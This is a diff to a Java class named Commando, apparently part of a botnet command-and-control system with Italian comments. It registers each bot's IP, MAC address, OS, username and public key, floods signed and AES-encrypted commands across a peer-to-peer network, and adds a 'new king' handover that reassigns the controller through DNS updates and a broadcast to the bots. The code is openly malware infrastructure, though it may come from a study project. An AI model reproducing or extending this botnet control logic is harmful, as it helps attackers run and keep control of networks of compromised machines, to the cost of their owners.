@@ -4,6 +4,7 @@ import java.io.UnsupportedEncodingException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
 import java.util.ArrayList;
@@ -80,12 +81,12 @@ public class Commando {
 	 * 
 	 */
 	public void initializeCeC() {
-		
-//		non necessario
-//		nServ.updateDnsInformation();
-		// TODO impostare vicinato cc
+
+		// non necessario
+		// nServ.updateDnsInformation();
 		newKing = "";
 		pServ.initP2P();
+		System.out.println("peer to peer fatto");
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
@@ -159,13 +160,21 @@ public class Commando {
 	 * @param userSSoID
 	 */
 	@Async
-	public void flooding(String cmd, String userSSoID) {
+	public void floodingByUser(String cmd, String userSSoID) {
 
 		User user = uServ.getUserRepository().findBySsoId(userSSoID);
 		if (user != null) {
-
+			flooding(cmd);
+		}
+		return;
+	}
+	
+	
+	
+	@Async
+	public void flooding(String cmd) {
 			String msg = "";
-			String request="";
+			String request = "";
 			// aggiungi nonce time.millis
 			Long milli = System.currentTimeMillis();
 
@@ -178,27 +187,45 @@ public class Commando {
 			try {
 				signature = pki.signMessageRSA(hashIdMsg);
 				msg = hashIdMsg + "|" + cmd + "|" + signature;
-				request=pki.getCrypto().encryptAES(msg);
+				request = pki.getCrypto().encryptAES(msg);
 			} catch (InvalidKeyException | SignatureException e) {
 				e.printStackTrace();
 				System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
 			}
 
 			startFlood(request);
-		}
 		return;
 	}
+	
+	
 
 	/**
+	 * @param pk 
+	 * @param ip 
 	 * @return
 	 */
-	public boolean newKingDns() {
+	public boolean newKingDns(IP ip, String pk) {
+		System.out.println("dns nk");
+		return nServ.updateDnsInformation(ip, pk);
+	}
+
+	public boolean newKingFlood(IP ip, String pk) {
+		String msg="newking<CC>"+ip+"<CC>"+pk;
+		flooding(msg);
+		return false;
+	}
+
+	public boolean abdicate() {
+
 		System.out.println("dns nk");
 		Bot b = bServ.searchBotIP(newKing);
 		if (b != null) {
-			System.out.println("bot dns"+ b.getIp());
-			return nServ.updateDnsInformation(new IP(newKing),b.getPubKey());
-			
+			System.out.println("bot dns" + b.getIp());
+			IP ip = new IP(newKing);
+			String pk = b.getPubKey();
+			newKingDns(ip,pk);
+			newKingFlood(ip,pk);
+			return true;
 		}
 		return false;
 	}
